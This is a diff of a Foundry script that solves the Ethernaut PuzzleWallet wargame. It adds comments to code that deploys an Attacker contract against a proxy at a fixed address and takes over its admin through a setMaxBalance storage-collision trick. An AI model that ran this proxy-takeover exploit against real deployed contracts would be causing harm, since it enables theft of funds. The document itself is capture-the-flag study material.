@@ -135,19 +135,24 @@ contract Attacker {
         puzzleProxy.setMaxBalance(uint256(uint160(msg.sender)));
     }
 }
-
+/// @author agadzhalov
+/// @title Solution to PuzzleWallet Ethernaut challenge
 contract PuzzleWalletScript is Script {
-
 
     function run() public {    
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
         IPuzzleProxy puzzleProxy = IPuzzleProxy(0x0E138cDea2B50830b72eba736398DD521c51A6BF);
+
+        // Logging the current admin address before the attack
         console.log("Old Admin", puzzleProxy.admin());
 
+        // Deploying the Attacker contract with a small amount of ether, targeting the proxy contract
         new Attacker{value: 0.001 ether}(0x0E138cDea2B50830b72eba736398DD521c51A6BF);
 
+        // Logging the new admin address after the attack
         console.log("New Admin", puzzleProxy.admin());
+
         vm.stopBroadcast();
     }
 }
